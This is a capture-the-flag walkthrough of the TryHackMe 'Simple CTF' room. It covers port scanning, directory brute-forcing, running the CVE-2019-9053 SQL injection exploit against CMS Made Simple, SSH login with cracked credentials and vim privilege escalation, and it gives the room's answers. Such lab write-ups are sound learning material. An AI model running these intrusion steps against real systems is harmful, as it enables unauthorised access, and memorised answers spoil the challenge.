# [Simple CTF][1]

#### Scan the Machine
> If you are unsure how to tackle this, I recommend checking out the [Nmap Tutorials by Hack Hunt][2].

`nmap -sV -Pn <IP>`

![Nmap Scan](images/open_ports.jpg)

Looks like we have three ports open: `21, 80, 2222`

*How many services are running under port 1000?*
> ***2***

*What is running on the higher port?*
> ***SSH***

- Checked the website, nothing much.

- Checked `robots.txt`, found some details. I think I found a username. Will investigate later.

![Robot.txt](images/robots.jpg)

- Run GoBuster -> `gobuster dir http://<IP> -w /usr/share/wordlists/dirb/common.txt`

![GoBuster](images/gobuster.jpg)

> There is one directory that catches my eye is `/simple`. So I checked the site `http://<IP>/simple`. Seems like ***CMS Made Simple*** Webpage. At the bottom there is version of it mentioned as well.

![CMS](images/cms.jpg)

The `CMS made simple 2.2.8` can be searched on CVE Details website for vulnerability or `searchsploit` database can be used, CMD -> `searchsploit cms made simple 2.2.8`

![Searchsploit Result](images/searchexploit.jpg)
> Looks like we found an **SQL Injection** with this version and the exploit is located in `/usr/share/exploitdb/exploits/php/webapps/46635.py`

Check the file data to get the CVE number.

![CVE Details](images/cve.jpg)

*What's the CVE you're using against the application?*
> ***CVE-2019-9053***

*To what kind of vulnerability is the application vulnerable?*
> ***SQLi***

Run the file -> `sudo python /usr/share/exploitdb/exploits/php/webapps/46635.py`

![Run file](images/run_tech.jpg)

> If you have an error for *termcolor*.

![Python Error](images/python_error.jpg)

Download the **binaries** from the [Official Website][3]. Unzip the file using command `tar -xf <file_name>`. Change directory to the extracted folder and run `sudo python setup.py install`. This will solve your termcolor error.

Run the file with `sudo python usr/share/exploitdb/exploits/php/webapps/46635.py -u http://<IP>/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`

![Script Run](images/script_run.jpg)

> The user credential is `mitch:secret`

*What's the password?*
> **secret**

As we know `ssh` is open. Let's try to connect -> `ssh mitch@<IP> -p 2222`

![SSH](images/ssh.jpg)

*What's the user flag?*

![User Flag](images/user_flag.jpg)

*Is there any other user in the home directory? What's its name?*
> ***sunbath***

![Other User](images/other_user.jpg)

*What can you leverage to spawn a privileged shell?*
> ***vim***

![Privilege Escalation](images/priv_escal.jpg)

First let's make this shell stable by typing -> `python3 -c 'import pty;pty.spwan("/bin/bash")'`.

![Stable Shell](images/shell_stable.jpg)

I searched online for privilege escalation for `vim` and I got a link from [GTFOBins][4].

Run the commands.

![Vim Escalate](images/vim_escal.jpg)

*What's the root flag?*

![Root Flag](images/root_flag.jpg)

[1]: https://tryhackme.com/room/easyctf
[2]: https://www.hackhunt.in/search/label/Nmap
[3]: https://pypi.org/project/termcolor/#files
[4]: https://gtfobins.github.io/gtfobins/vim/
